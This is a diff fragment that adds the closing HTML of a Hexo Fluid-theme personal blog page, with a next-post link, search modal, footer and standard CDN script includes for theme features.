+                      <a href="/2021/12/14/%E6%9F%90%E6%A8%A1%E7%89%88%E5%8F%AF%E7%96%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/" title="某模版可疑函数的分析记录">
+                        <span class="hidden-mobile">某模版可疑函数的分析记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <span>K1nm0 © 2019 – 2022 </span> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
